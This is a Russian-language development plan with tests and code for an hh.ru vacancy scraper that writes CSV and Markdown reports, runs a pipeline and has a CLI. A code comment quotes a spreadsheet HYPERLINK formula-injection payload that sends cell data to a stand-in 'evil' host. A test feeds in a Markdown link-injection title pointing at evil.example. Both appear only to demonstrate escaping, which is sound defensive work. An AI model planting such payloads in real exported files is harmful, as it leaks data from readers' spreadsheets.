    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Получше") < text.index("Похуже")


def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "### embedded" in text
    assert "### backend" in text
    assert "https://hh.ru/vacancy/1" in text


def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
    """Три поля, за которые заплачено запросом к странице вакансии. Без них
    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text


def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
    быть — это обычный случай, а не ошибка (спека §3.4)."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(salary=Salary(), area=None)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · — · зарплата не указана" in text


def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
    быть выжимкой и читается дольше, чем сама страница вакансии."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "я" * SNIPPET_LENGTH + "…" in text
    assert "я" * (SNIPPET_LENGTH + 1) not in text


def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
    """Описание приходит со страницы многострочным (`html_to_text` ставит
    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
    это конец пункта для любого рендерера markdown."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Требуется опыт. Yocto и BSP.…" in text


def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
    из `unreported()` навсегда."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("# Новые вакансии") == 2
    assert "Утренняя" in text
    assert "Вечерняя" in text


def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
    на чужой сайт."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[Удалённо\]" in text
    # Единственная настоящая ссылка в отчёте — на hh.ru.
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


# --- фабрика и пустой вход ------------------------------------------------


def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
    CsvSink(tmp_path).emit([], NOW)
    MarkdownSink(tmp_path, threshold=60.0).emit([], NOW)
    assert list(tmp_path.iterdir()) == []


def test_build_sinks_resolves_names(tmp_path: Path) -> None:
    sinks = build_sinks(["csv", "markdown"], tmp_path, threshold=60.0)
    assert [sink.name for sink in sinks] == ["csv", "markdown"]


def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
    отказывает, ничего не создав."""
    with pytest.raises(ValueError, match="telegram"):
        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
    assert list(tmp_path.iterdir()) == []
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_sinks.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.sinks'`, «1 error»

- [ ] **Step 3: Реализовать `hh_search/sinks/base.py`**

```python
from collections.abc import Sequence
from datetime import datetime
from typing import Protocol

from hh_search.domain.models import ScoredVacancy

# Формат даты в отчётах: без микросекунд и без смещения. Из базы даты
# приходят как aware UTC (`storage/time_utils.py`), то есть isoformat() дал
# бы «2026-07-27T11:48:48.366000+00:00» — Excel такую строку числом не
# считает, а человеку она нечитаема. Время в отчёте — UTC, как в базе.
REPORT_DATE_FORMAT = "%Y-%m-%d %H:%M"


class Sink(Protocol):
    """Точка расширения: сюда позже встанет TelegramSink."""

    name: str

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None: ...
```

- [ ] **Step 4: Реализовать `hh_search/sinks/csv_sink.py`**

```python
import csv
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

from hh_search.domain.models import ScoredVacancy
from hh_search.sinks.base import REPORT_DATE_FORMAT

# `listing`, а не `found_by_query`: после переезда discovery на листинги в
# этом поле лежит slug (`programmist`), а не текст поискового запроса.
COLUMNS = [
    "id",
    "score",
    "cluster",
    "title",
    "company",
    "area",
    "salary_from",
    "salary_to",
    "currency",
    "published_at",
    "listing",
    "url",
]

# Excel и LibreOffice исполняют содержимое ячейки, начинающееся с этих
# символов. Заголовок и название компании пишет работодатель, то есть это
# внешний недоверенный текст: `=HYPERLINK("http://evil/?u="&A1;"вакансия")`
# в заголовке превращает отчёт в утечку. Квотирование модуля csv от формул
# не защищает — оно про разделители, а не про интерпретацию.
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")


def _cell(value: object) -> str:
    """Значение ячейки: строка, обезвреженная от интерпретации формулой.

    Апостроф перед значением — то, что понимают и Excel, и LibreOffice:
    ячейка остаётся текстом. Числовые колонки этого не боятся (они
    формируются нами и неотрицательны), но правило применяется ко всем,
    чтобы не пришлось помнить, какая колонка внешняя.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_STARTS) else text


class CsvSink:
    """Полная выгрузка нового: в CSV идёт всё, порога здесь нет (спека §6.3).

    Формат подчинён единственному потребителю — таблице на рабочем столе:
    UTF-8 с BOM и разделитель `;`, иначе русский текст в Excel читается как
    `ÐžÐžÐž`, а с русской локалью вся строка ложится в одну колонку.
    """

    name = "csv"

    def __init__(self, reports_dir: Path) -> None:
        self._reports_dir = reports_dir

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if not vacancies:
            return
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.csv"
        first_write = not path.exists()
        # BOM обязан быть ровно один: кодек utf-8-sig пишет его при каждом
        # открытии файла, поэтому второй прогон того же дня вставил бы
        # ещё один U+FEFF посреди данных.
        encoding = "utf-8-sig" if first_write else "utf-8"
        with path.open("a", newline="", encoding=encoding) as handle:
            writer = csv.DictWriter(handle, fieldnames=COLUMNS, delimiter=";")
            if first_write:
                writer.writeheader()
            for item in vacancies:
                writer.writerow(self._row(item))

    def _row(self, item: ScoredVacancy) -> dict[str, str]:
        discovered = item.discovered
        salary = discovered.salary
        published_at = discovered.published_at
        return {
            "id": _cell(discovered.id),
            "score": _cell(item.score.total),
            "cluster": _cell(item.cluster),
            "title": _cell(discovered.title),
            "company": _cell(discovered.company),
            "area": _cell(discovered.area),
            "salary_from": _cell(salary.amount_from),
            "salary_to": _cell(salary.amount_to),
            "currency": _cell(salary.currency),
            # Пустая ячейка, а не «None»: дата публикации неизвестна, пока
            # вакансия не обогащена, и выдумывать её нечем (спека §5.3).
            "published_at": _cell(
                None if published_at is None else format(published_at, REPORT_DATE_FORMAT)
            ),
            "listing": _cell(discovered.found_by_query),
            "url": _cell(discovered.url),
        }
```

- [ ] **Step 5: Реализовать `hh_search/sinks/markdown_sink.py`**

```python
import re
from collections.abc import Sequence
from datetime import datetime
from itertools import groupby
from pathlib import Path

from hh_search.domain.models import ScoredVacancy

SNIPPET_LENGTH = 200

# Заголовок и описание пишет работодатель. `[Удалённо] Инженер` в начале
# названия на hh.ru встречается, а `**[Ссылка](https://evil/) конец]
# (https://hh.ru/vacancy/4)**` превращает пункт отчёта в рабочую ссылку на
# чужой сайт. Экранируется то, что меняет структуру строки.
_MARKDOWN_SPECIAL = re.compile(r"([\\`*_\[\]])")


def _collapse(text: str) -> str:
    """Одна строка вместо любого числа: перевод строки внутри пункта списка
    ломает разметку не хуже скобки."""
    return " ".join(text.split())


def _escape(text: str) -> str:
    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)


def _plain(text: str | None, fallback: str = "—") -> str:
    return _escape(_collapse(text)) if text else fallback


class MarkdownSink:
    """Отчёт для чтения глазами: «Топ» по кластерам и свёрнутое «Остальное».

    Порог ничего не прячет, он меняет подробность показа (спека §6.3):
    вакансия на пороге РОВНО попадает в «Топ» (`>=`), а всё, что ниже, —
    одной строкой. Раздел «Остальное» и есть обратная связь по качеству
    скоринга, поэтому пустым он не остаётся молча.
    """

    name = "markdown"

    def __init__(self, reports_dir: Path, threshold: float) -> None:
        self._reports_dir = reports_dir
        self._threshold = threshold

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if not vacancies:
            return
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.md"
        ordered = sorted(vacancies, key=lambda item: item.score.total, reverse=True)
        top = [item for item in ordered if item.score.total >= self._threshold]
        rest = [item for item in ordered if item.score.total < self._threshold]

        lines = [f"# Новые вакансии — {now:%Y-%m-%d %H:%M}", "", "## Топ", ""]
        if top:
            # Сортировка по кластеру устойчива, поэтому внутри кластера
            # сохраняется порядок по убыванию балла из `ordered`.
            for cluster, group in groupby(
                sorted(top, key=lambda item: item.cluster), key=lambda item: item.cluster
            ):
                lines += [f"### {cluster}", ""]
                lines += [self._full_entry(item) for item in group]
        else:
            lines += ["_ничего выше порога_", ""]

        lines += ["## Остальное", ""]
        lines += [self._short_entry(item) for item in rest] if rest else ["_пусто_", ""]

        # Дописывание, а не перезапись: прогон идёт раз в несколько часов, и
        # 'w' затирал бы утренние находки вечерними без следа — переотправки
        # нет по построению, `mark_reported` уводит вакансию из `unreported`
        # навсегда.
        with path.open("a", encoding="utf-8") as handle:
            handle.write("\n".join(lines).rstrip() + "\n\n")

    def _full_entry(self, item: ScoredVacancy) -> str:
        discovered = item.discovered
        snippet = _escape(_collapse(item.details.description)[:SNIPPET_LENGTH])
        return (
            f"**[{_plain(discovered.title)}]({discovered.url})** — {item.score.total:.0f}\n\n"
            f"{_plain(discovered.company)} · {_plain(discovered.area)} · "
            f"{_plain(discovered.salary.raw, fallback='зарплата не указана')}\n\n"
            f"{snippet}…\n"
        )

    def _short_entry(self, item: ScoredVacancy) -> str:
        discovered = item.discovered
        return (
            f"- [{_plain(discovered.title)}]({discovered.url}) — "
            f"{item.score.total:.0f} · {_plain(discovered.company)}"
        )
```

- [ ] **Step 6: Реализовать `hh_search/sinks/__init__.py`**

```python
"""Приёмники отчётов и их фабрика.

`build_sinks` вызывается ДО `start_run()` и до первого сетевого запроса
(требование спеки §7/§9: опечатка роняет процесс на старте). Иначе
неизвестное имя в `app.yaml` обнаруживается в середине прогона — когда за
страницы уже заплачено запросами к hh.ru, а отчёт всё равно не выйдет.
Проверять имена типом (`Literal["csv", "markdown"]` в конфиге) не стали:
это раздвоило бы список приёмников между схемой конфига и этой фабрикой,
а расширение через `Sink` — заявленная точка роста (спека §4.2).
"""

from collections.abc import Sequence
from pathlib import Path

from hh_search.sinks.base import Sink
from hh_search.sinks.csv_sink import CsvSink
from hh_search.sinks.markdown_sink import MarkdownSink

__all__ = ["CsvSink", "MarkdownSink", "Sink", "build_sinks"]


def build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]:
    sinks: list[Sink] = []
    for name in names:
        if name == "csv":
            sinks.append(CsvSink(reports_dir))
        elif name == "markdown":
            sinks.append(MarkdownSink(reports_dir, threshold))
        else:
            raise ValueError(f"неизвестный sink: {name}")
    return sinks
```

- [ ] **Step 7: Запустить все проверки**

Run: `uv run pytest tests/test_sinks.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/sinks tests/test_sinks.py`
Expected: `18 passed`, затем `277 passed`, `Success: no issues found`, `All checks passed!`,
`5 files already formatted`

- [ ] **Step 8: Коммит**

```bash
git add hh_search/sinks tests/test_sinks.py
git commit -m "feat: отчёты в CSV и Markdown

Оба формата — реализации одного протокола Sink, к которому позже
подключится Telegram без правок в конвейере. Markdown делится на
Топ по кластерам и свёрнутое Остальное: порог ничего не прячет,
он только меняет подробность показа.

Формат подчинён потребителю и внешним данным: BOM и разделитель ';'
(иначе Excel показывает ÐžÐžÐž и одну колонку), префикс ' для значений,
начинающихся с '=', '+', '-', '@' (заголовок пишет работодатель),
экранирование markdown в заголовке и сниппете, явный формат даты
вместо isoformat с микросекундами. Второй прогон дня дописывает
отчёт, а не затирает: переотправки нет по построению."
```

---

### Task 10: Конвейер

**Files:**
- Create: `hh_search/pipeline.py`
- Test: `tests/test_pipeline.py`

**Interfaces:**
- Consumes: всё из задач 1–9
- Produces: `class RunStats` (pydantic: `discovered: int`, `new_count: int`, `rejected: int`, `enriched: int`, `reported: int`, `status: str`, `error: str | None`); `run_once(config: Config, client: PoliteClient, repo: SqliteRepository, scorer: Scorer, sinks: Sequence[Sink], now: datetime | None = None) -> RunStats`

Порядок и правила:
1. `start_run()`; далее любой `AccessForbidden` → `status="failed"`, конвейер прерывается.
2. По каждому запросу: `build_rss_url` → `client.get` с условными заголовками из `repo.cache_headers` → при `304` пропуск → `parse_feed`. Сетевая ошибка одного запроса (`FetchFailed`, `RobotsDisallowed`) → `WARNING` и `status="partial"`, остальные запросы продолжаются.
3. `repo.add_discovered(...)` для каждой вакансии; новыми считаются те, для которых он вернул `True`.
4. Для каждой новой — `Prefilter.reason_to_reject`; при отказе `repo.mark_rejected`.
5. `repo.pending_enrichment(max_attempts)` → `client.get(vacancy_url(id))` → `parse_vacancy_page` → `repo.save_details`. Ошибка → `repo.bump_enrich_attempt`; если счётчик достиг предела → `repo.mark_rejected(id, "enrich_failed")`. Если попыток было больше нуля и **более половины** провалились → `logger.error` с текстом про вероятную смену вёрстки.
6. Скоринг всех, у кого есть описание и нет оценки (берём из `repo.unreported()` — там гарантированно есть описание, оценку проставляем сразу после сохранения деталей).
7. `repo.unreported()` → каждый sink вызывается в `try/except`; при успехе **всех** sink'ов → `repo.mark_reported`. Если хоть один упал — вакансии остаются `new` и уедут следующим прогоном.
8. `finish_run(...)` со счётчиками.

- [ ] **Step 1: Написать падающий интеграционный тест**

Создать `tests/test_pipeline.py`:

```python
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

import httpx
import pytest
import respx

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.domain.models import ScoredVacancy
from hh_search.errors import AccessForbidden
from hh_search.pipeline import run_once
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository
from tests.test_config import write_config

NOW = datetime(2026, 7, 27, 10, 0, 0)

FEED = """<?xml version='1.0' encoding='utf-8'?>
<rss version="2.0"><channel>
<item><pubDate>2026-07-27T09:21:20.933+03:00</pubDate>
<title>Senior Embedded Engineer</title>
<link>https://hh.ru/vacancy/111</link>
<description><![CDATA[<p>Вакансия компании: ООО Ромашка</p> <p>Регион: Нижний Новгород</p> <p>Предполагаемый уровень месячного дохода: от 200 000 руб.</p>]]></description>
</item>
<item><pubDate>2026-07-27T09:22:20.933+03:00</pubDate>
<title>Junior Python Developer</title>
<link>https://hh.ru/vacancy/222</link>
<description><![CDATA[<p>Вакансия компании: ООО Лютик</p> <p>Регион: Москва</p> <p>Предполагаемый уровень месячного дохода: не указан</p>]]></description>
</item>
</channel></rss>
"""

PAGE = (
    '<html><script type="application/ld+json">'
    '{"@type": "JobPosting", "title": "Senior Embedded Engineer", '
    '"description": "<p>Yocto, Buildroot, C++. Архитектура и менторинг.</p>"}'
    "</script></html>"
)


class RecordingSink:
    name = "recording"

    def __init__(self, fail: bool = False) -> None:
        self.batches: list[list[str]] = []
        self._fail = fail

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if self._fail:
            raise RuntimeError("sink недоступен")
        self.batches.append([item.discovered.id for item in vacancies])


@pytest.fixture()
def config(tmp_path: Path) -> Config:
    return load_config(write_config(tmp_path))


@pytest.fixture()
def repo() -> SqliteRepository:
    repository = SqliteRepository(":memory:")
    repository.init_schema()
    return repository


def make_client(config: Config) -> PoliteClient:
    return PoliteClient(config.app.http, config.app.user_agent, sleep=lambda _: None)


def mock_hh(feed: str = FEED, page_status: int = 200) -> None:
    respx.get(url__startswith="https://hh.ru/search/vacancy/rss").mock(
        return_value=httpx.Response(200, text=feed)
    )
    respx.get(url__startswith="https://hh.ru/vacancy/").mock(
        return_value=httpx.Response(page_status, text=PAGE)
    )


@respx.mock
def test_full_run_reports_only_surviving_vacancy(config: Config, repo: SqliteRepository) -> None:
    mock_hh()
    sink = RecordingSink()
    stats = run_once(config, make_client(config), repo, KeywordScorer(config.profile), [sink], NOW)
    assert stats.status == "ok"
    assert stats.discovered == 2
    assert stats.new_count == 2
    assert stats.rejected == 1          # Junior отсеян префильтром
    assert stats.enriched == 1
    assert sink.batches == [["111"]]


@respx.mock
def test_second_run_reports_nothing_new(config: Config, repo: SqliteRepository) -> None:
    mock_hh()
    scorer = KeywordScorer(config.profile)
    run_once(config, make_client(config), repo, scorer, [RecordingSink()], NOW)
    sink = RecordingSink()
    stats = run_once(config, make_client(config), repo, scorer, [sink], NOW)
    assert stats.new_count == 0
    assert sink.batches == []


@respx.mock
def test_rejected_vacancy_is_never_fetched(config: Config, repo: SqliteRepository) -> None:
    mock_hh()
    page_route = respx.get(url__startswith="https://hh.ru/vacancy/")
    run_once(config, make_client(config), repo, KeywordScorer(config.profile), [], NOW)
    requested = {call.request.url.path for call in page_route.calls}
    assert "/vacancy/222" not in requested


@respx.mock
def test_failing_sink_leaves_vacancy_unreported(config: Config, repo: SqliteRepository) -> None:
    mock_hh()
    scorer = KeywordScorer(config.profile)
    run_once(config, make_client(config), repo, scorer, [RecordingSink(fail=True)], NOW)
    assert [item.discovered.id for item in repo.unreported()] == ["111"]

    sink = RecordingSink()
    run_once(config, make_client(config), repo, scorer, [sink], NOW)
    assert sink.batches == [["111"]]


@respx.mock
def test_forbidden_aborts_the_run(config: Config, repo: SqliteRepository) -> None:
    respx.get(url__startswith="https://hh.ru/search/vacancy/rss").mock(
        return_value=httpx.Response(403)
    )
    with pytest.raises(AccessForbidden):
        run_once(config, make_client(config), repo, KeywordScorer(config.profile), [], NOW)
    assert repo.last_successful_run() is None


@respx.mock
def test_enrichment_failure_is_retried_next_run(config: Config, repo: SqliteRepository) -> None:
    mock_hh(page_status=404)
    scorer = KeywordScorer(config.profile)
    stats = run_once(config, make_client(config), repo, scorer, [], NOW)
    assert stats.enriched == 0
    assert stats.status == "partial"
    assert [v.id for v in repo.pending_enrichment(config.app.enrich.max_attempts)] == ["111"]
```

> Тест использует `write_config` из `tests/test_config.py`. Убедитесь, что `tests/__init__.py` существует (создан в Task 1), иначе импорт не разрешится.

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_pipeline.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.pipeline'`

- [ ] **Step 3: Реализовать `hh_search/pipeline.py`**

```python
import logging
from collections.abc import Sequence
from datetime import datetime

from pydantic import BaseModel

from hh_search.config.models import Config
from hh_search.errors import AccessForbidden, FetchFailed, RobotsDisallowed
from hh_search.filtering.prefilter import Prefilter
from hh_search.scoring.base import Scorer
from hh_search.sinks.base import Sink
from hh_search.sources.http import PoliteClient
from hh_search.sources.rss import build_rss_url, parse_feed
from hh_search.sources.vacancy_page import parse_vacancy_page, vacancy_url
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)


class RunStats(BaseModel):
    discovered: int = 0
    new_count: int = 0
    rejected: int = 0
    enriched: int = 0
    reported: int = 0
    status: str = "ok"
    error: str | None = None


def run_once(
    config: Config,
    client: PoliteClient,
    repo: SqliteRepository,
    scorer: Scorer,
    sinks: Sequence[Sink],
    now: datetime | None = None,
) -> RunStats:
    moment = now or datetime.now()
    stats = RunStats()
    prefilter = Prefilter(config.profile)
    run_id = repo.start_run()

    try:
        stats.new_count, stats.discovered = _discover(config, client, repo, stats)
        stats.rejected = _prefilter(repo, prefilter, config)
        stats.enriched = _enrich(config, client, repo, scorer, stats)
        stats.reported = _emit(repo, sinks, moment)
    except AccessForbidden as error:
        stats.status = "failed"
        stats.error = str(error)
        logger.error("прогон остановлен: %s", error)
        repo.finish_run(run_id, "failed", error=str(error), **_counters(stats))
        raise
    except Exception as error:  # noqa: BLE001 — журнал прогона обязан закрыться
        stats.status = "failed"
        stats.error = str(error)
        repo.finish_run(run_id, "failed", error=str(error), **_counters(stats))
        raise

    repo.finish_run(run_id, stats.status, error=stats.error, **_counters(stats))
    logger.info(
        "прогон завершён: %s, найдено %d, новых %d, отсеяно %d, обогащено %d, отправлено %d",
        stats.status, stats.discovered, stats.new_count, stats.rejected,
        stats.enriched, stats.reported,
    )
    return stats


def _counters(stats: RunStats) -> dict[str, int]:
    return {
        "discovered": stats.discovered,
        "new_count": stats.new_count,
        "rejected": stats.rejected,
        "enriched": stats.enriched,
        "reported": stats.reported,
    }


def _discover(
    config: Config, client: PoliteClient, repo: SqliteRepository, stats: RunStats
) -> tuple[int, int]:
    new_count = 0
    discovered = 0
    for query in config.queries.queries:
        url = build_rss_url(query)
        try:
            response = client.get(url, conditional=repo.cache_headers(url))
        except (FetchFailed, RobotsDisallowed) as error:
            logger.warning("запрос %r пропущен: %s", query.text, error)
            stats.status = "partial"
            continue

        if response.status_code == 304:
            logger.debug("лента %r не изменилась", query.text)
            continue

        repo.save_cache_headers(
            url, response.headers.get("ETag"), response.headers.get("Last-Modified")
        )
        for vacancy in parse_feed(response.text, query.text):
            discovered += 1
            if repo.add_discovered(vacancy, query.cluster, query.weight):
                new_count += 1
    return new_count, discovered


def _prefilter(repo: SqliteRepository, prefilter: Prefilter, config: Config) -> int:
    rejected = 0
    for vacancy in repo.pending_enrichment(config.app.enrich.max_attempts):
        reason = prefilter.reason_to_reject(vacancy)
        if reason:
            repo.mark_rejected(vacancy.id, reason)
            rejected += 1
    return rejected


def _enrich(
    config: Config, client: PoliteClient, repo: SqliteRepository, scorer: Scorer, stats: RunStats
) -> int:
    pending = repo.pending_enrichment(config.app.enrich.max_attempts)
    enriched = 0
    failed = 0
    for vacancy in pending:
        try:
            response = client.get(vacancy_url(vacancy.id))
            if response.status_code != 200:
                raise FetchFailed(f"{response.status_code} на {vacancy.url}")
            details = parse_vacancy_page(response.text)
        except (FetchFailed, RobotsDisallowed) as error:
            failed += 1
            stats.status = "partial"
            attempts = repo.bump_enrich_attempt(vacancy.id)
            logger.warning("не удалось обогатить %s (попытка %d): %s", vacancy.id, attempts, error)
            if attempts >= config.app.enrich.max_attempts:
                repo.mark_rejected(vacancy.id, "enrich_failed")
            continue

        repo.save_details(vacancy.id, details)
        repo.save_score(vacancy.id, scorer.score(vacancy, details))
        enriched += 1

    if pending and failed * 2 > len(pending):
        logger.error(
            "провалено %d обогащений из %d — вероятно, hh.ru сменил вёрстку страницы вакансии",
            failed, len(pending),
        )
    return enriched


def _emit(repo: SqliteRepository, sinks: Sequence[Sink], moment: datetime) -> int:
    pending = repo.unreported()
    if not pending:
        return 0

    all_succeeded = True
    for sink in sinks:
        try:
            sink.emit(pending, moment)
        except Exception as error:  # noqa: BLE001 — падение sink'а не должно терять вакансии
            all_succeeded = False
            logger.warning("sink %s упал: %s", sink.name, error)

    if all_succeeded:
        repo.mark_reported([item.discovered.id for item in pending])
        return len(pending)
    return 0
```

- [ ] **Step 4: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_pipeline.py -v && uv run mypy hh_search`
Expected: 6 passed

- [ ] **Step 5: Прогнать весь набор тестов**

Run: `uv run pytest -v && uv run ruff check . && uv run mypy hh_search`
Expected: все тесты зелёные

- [ ] **Step 6: Коммит**

```bash
git add hh_search/pipeline.py tests/test_pipeline.py
git commit -m "feat: конвейер прогона

Семь шагов по спеке. Сохранение идёт до отправки, а отправка берёт
данные из базы по status=new, поэтому падение sink'а или контейнера
между шагами ничего не теряет. Канарейка на >50% провалов обогащения
ловит смену вёрстки hh.ru в тот же день."
```

---

### Task 11: CLI, логи и планировщик

**Files:**
- Create: `hh_search/logging_setup.py`, `hh_search/scheduler.py`, `hh_search/__main__.py`
- Test: `tests/test_cli.py`

**Interfaces:**
- Consumes: всё предыдущее
- Produces: `setup_logging(logs_dir: Path) -> None`; `serve(config: Config, run: Callable[[], None], sleep: Callable[[float], None] = time.sleep, iterations: int | None = None) -> None`; typer-приложение `app` с командами `run`, `serve`, `init-db`, `healthcheck`, `report`, `mark`

Команды:
- `run` — один прогон. Спека §8.3 писала `run --once`, но флаг ничего не менял: команда всегда делает ровно один прогон. Лишний параметр убран, отклонение фиксируется в Task 13.
- `serve` — бесконечный цикл; исключение внутри прогона логируется и **не** роняет процесс, кроме `AccessForbidden`, который тоже логируется, но цикл продолжается — иначе контейнер будет перезапускаться в петле
- `init-db` — создать схему
- `healthcheck` — код возврата 0, если последний успешный прогон свежее `2 × interval_hours`, иначе 1
- `report --since 7d` — перегенерировать отчёт из базы по вакансиям со статусом `reported`
- `mark <id> <status>` — проставить статус вручную

Общая опция `--config-dir` (по умолчанию `/data/config`, переопределяется переменной `HH_CONFIG_DIR`).

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_cli.py`:

```python
from datetime import UTC, datetime, timedelta
from pathlib import Path

from typer.testing import CliRunner

from hh_search.__main__ import app
from hh_search.config.loader import load_config
from hh_search.scheduler import serve
from hh_search.storage.repository import SqliteRepository
from tests.test_config import write_config

runner = CliRunner()


def prepare(tmp_path: Path) -> Path:
    config_dir = tmp_path / "config"
    config_dir.mkdir()
    write_config(config_dir)
    state = tmp_path / "state"
    state.mkdir()
    app_yaml = (config_dir / "app.yaml").read_text(encoding="utf-8")
    app_yaml = app_yaml.replace("/data/state/hh.db", str(state / "hh.db"))
    app_yaml = app_yaml.replace("/data/reports", str(tmp_path / "reports"))
    app_yaml = app_yaml.replace("/data/logs", str(tmp_path / "logs"))
    (config_dir / "app.yaml").write_text(app_yaml, encoding="utf-8")
    return config_dir


def test_init_db_creates_state_file(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    result = runner.invoke(app, ["--config-dir", str(config_dir), "init-db"])
    assert result.exit_code == 0
    assert (tmp_path / "state" / "hh.db").exists()


def test_healthcheck_fails_without_any_run(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    runner.invoke(app, ["--config-dir", str(config_dir), "init-db"])
    result = runner.invoke(app, ["--config-dir", str(config_dir), "healthcheck"])
    assert result.exit_code == 1


def test_healthcheck_passes_after_fresh_run(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    runner.invoke(app, ["--config-dir", str(config_dir), "init-db"])
    config = load_config(config_dir)
    with SqliteRepository(config.app.paths.state) as repo:
        repo.finish_run(repo.start_run(), "ok")
    result = runner.invoke(app, ["--config-dir", str(config_dir), "healthcheck"])
    assert result.exit_code == 0


def test_healthcheck_fails_on_stale_run(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    runner.invoke(app, ["--config-dir", str(config_dir), "init-db"])
    config = load_config(config_dir)
    stale = datetime.now(UTC) - timedelta(hours=24)
    with SqliteRepository(config.app.paths.state) as repo:
        repo.finish_run(repo.start_run(), "ok", finished_at=stale)
    result = runner.invoke(app, ["--config-dir", str(config_dir), "healthcheck"])
    assert result.exit_code == 1


def test_mark_sets_status(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    runner.invoke(app, ["--config-dir", str(config_dir), "init-db"])
    result = runner.invoke(app, ["--config-dir", str(config_dir), "mark", "111", "applied"])
    assert result.exit_code == 0


def test_serve_runs_requested_number_of_iterations() -> None:
    from hh_search.config.models import AppConfig, Config, PathsConfig, ScheduleConfig

    calls: list[int] = []
    delays: list[float] = []

    def one_run() -> None:
        calls.append(1)

    config = Config.model_construct(
        app=AppConfig.model_construct(
            schedule=ScheduleConfig(interval_hours=2),
            paths=PathsConfig(state=Path("x"), reports=Path("y"), logs=Path("z")),
        )
    )
    serve(config, one_run, sleep=delays.append, iterations=3)
    assert len(calls) == 3
    assert delays == [7200.0, 7200.0, 7200.0]


def test_serve_survives_an_exception_in_a_run() -> None:
    from hh_search.config.models import AppConfig, Config, PathsConfig, ScheduleConfig

    attempts: list[int] = []

    def failing_run() -> None:
        attempts.append(1)
        raise RuntimeError("сеть отвалилась")

    config = Config.model_construct(
        app=AppConfig.model_construct(
            schedule=ScheduleConfig(interval_hours=1),
            paths=PathsConfig(state=Path("x"), reports=Path("y"), logs=Path("z")),
        )
    )
    serve(config, failing_run, sleep=lambda _: None, iterations=2)
